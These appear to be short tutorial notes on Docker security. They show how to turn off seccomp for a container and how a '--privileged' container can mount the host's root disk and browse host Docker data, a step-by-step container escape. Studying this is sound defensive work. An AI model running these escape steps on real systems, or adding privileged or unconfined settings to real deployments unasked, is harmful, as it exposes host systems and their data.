# This removes all seccomp security, like in previous Docker versions. How is shocker.c breakout now restricted?

docker run --rm -it --security-opt seccomp:unconfined benhall/strace:latest sh

# The privileged flag returns the container into a "super container" without any restrictions.
#Â Once you've gained access to a priviledged container you can gain access to the host
# For example, mounting the root disk

docker run -it --privileged ubuntu bash
df -h ## find the disk Id
mkdir /host && mount /dev/sda1 /host
ls /host/var/lib/docker/containers/
